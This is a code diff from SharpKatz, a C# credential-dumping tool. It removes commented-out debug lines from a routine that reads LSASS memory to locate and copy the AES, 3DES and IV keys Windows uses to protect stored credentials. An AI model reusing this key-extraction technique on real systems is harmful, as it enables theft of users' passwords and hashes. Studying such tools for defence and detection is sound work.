@@ -93,7 +93,6 @@ namespace SharpKatz
                 Console.WriteLine("[x] Error: Could not find offset to AES/3Des/IV keys\n");
                 return 1;
             }
-            //Console.WriteLine("[*] Found offset to AES/3Des/IV at {0}", keySigOffset);
 
             // Retrieve offset to InitializationVector address due to "lea reg, [InitializationVector]" instruction
             IntPtr tmp_p = IntPtr.Add(lsasrvMem, (int)keySigOffset + (int)oshelper.IV_OFFSET);
@@ -110,7 +109,6 @@ namespace SharpKatz
             // Retrieve offset to h3DesKey address due to "lea reg, [h3DesKey]" instruction
             byte[] desOffsetBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, 4);
             desOffset = BitConverter.ToInt32(desOffsetBytes, 0);
-            //Console.WriteLine("[*] h3DesKey offset found as {0}", desOffset);
 
             tmp_p = IntPtr.Add(lsasrvMem, (int)keySigOffset + (int)oshelper.DES_OFFSET + 4 + (int)desOffset);
             
@@ -127,7 +125,6 @@ namespace SharpKatz
             extracted3DesKey = Utility.ReadStruct<KIWI_BCRYPT_KEY81>(extracted3DesKeyByte);
 
             this.deskey = extracted3DesKey.hardkey.data;
-            //Marshal.Copy((IntPtr)extracted3DesKey.hardkey.data, this.deskey, 0, (int)extracted3DesKey.hardkey.cbSecret);
 
             tmp_p = IntPtr.Add(lsasrvMem, (int)keySigOffset + (int)oshelper.AES_OFFSET);
 
@@ -149,9 +146,7 @@ namespace SharpKatz
             byte[] extractedAesKeyBytes = Utility.ReadFromLsass(ref hLsass, hAesKey.key, Convert.ToUInt64(Marshal.SizeOf(typeof(KIWI_BCRYPT_KEY81))));
             extractedAesKey = Utility.ReadStruct<KIWI_BCRYPT_KEY81>(extractedAesKeyBytes);
 
-            
             this.aeskey = extractedAesKey.hardkey.data;
-            //Marshal.Copy((IntPtr)extractedAesKey.hardkey.data, this.aeskey, 0, (int)extractedAesKey.hardkey.cbSecret);
             
             return 0;
         }
